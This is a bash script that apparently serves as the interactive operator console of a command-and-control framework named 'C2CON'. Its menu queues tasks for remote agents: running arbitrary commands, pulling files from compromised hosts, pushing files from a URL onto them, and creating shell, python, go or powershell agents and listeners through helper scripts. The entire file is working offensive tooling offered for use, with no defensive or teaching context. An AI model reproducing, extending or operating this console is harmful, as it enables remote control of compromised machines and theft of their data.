
while true
do
echo """
  ______ ___     ______   ______   .__   __. 
 /      |__ \   /      | /  __  \  |  \ |  | 
|  ,----'  ) | |  ,----'|  |  |  | |   \|  | 
|  |      / /  |  |     |  |  |  | |  . \`  | 
|  \`----./ /_  |  \`----.|  \`--'  | |  |\   | 
 \______|____|  \______| \______/  |__| \__| 
 
                 Started from the bottom, we keep diggin
"""
echo "Action ?"
read action

if [ "$action" = "run" ]; then
echo "Agent ?"
read agent
echo "Ze Juice ?"
read cmd
echo "$agent:$action:$cmd" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $cmd" >> /tmp/C2CON-res.txt
sleep 2
clear


elif [ "$action" = "create" ]; then
echo "What ?"
read what

if [ "$what" = "agent" ]; then
echo "Type (shell/python/go/powershell) ?"
read type
echo "Filename ?"
read filename
echo "Endpoint ?"
read endpoint
echo "Mode Param ?"
read mode_param
echo "Reponse Param ?"
read resp_param
echo "Creating agent"
bash create_agent.sh  $type $filename $endpoint $mode_param $resp_param
sleep 2
clear


elif [ "$what" = "listener" ]; then
echo "Endpoint ?"
read endpoint
echo "Mode Param ?"
read mode_param
echo "Reponse Param ?"
read resp_param
echo "Creating and deploying listener"
bash create_listener.sh $endpoint $mode_param $resp_param
sleep 2
clear

else
echo "Create agent or listener"
sleep 2
clear
fi


elif [ "$action" = "download" ]; then
echo "Agent ?"
read agent
echo "Ze File ?"
read file
echo "$agent:$action:$file" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $file" >> /tmp/C2CON-res.txt
sleep 2
clear


elif [ "$action" = "upload" ]; then
echo "Agent ?"
read agent
echo "URL ?"
read url
echo "Path ?"
read path
echo "$agent:$action:$url:$path" >> /tmp/C2CON-cmds.txt
echo "Task to $agent => $action $url to $path" >> /tmp/C2CON-res.txt
sleep 2
clear


elif [ "$action" = "clear" ]; then
echo "file?"
read file

if [ "$file" = "cmds" ]; then
echo "" > /tmp/C2CON-cmds.txt
sleep 2
echo "Clearing cmds.txt"
clear
fi

if [ "$file" = "res" ]; then
echo "" > /tmp/C2CON-res.txt
sleep 2
echo "Clearing res.txt"
clear
else
echo "Unknown file"
fi

else
echo "Unknown cmd"
sleep 2
clear
fi

done
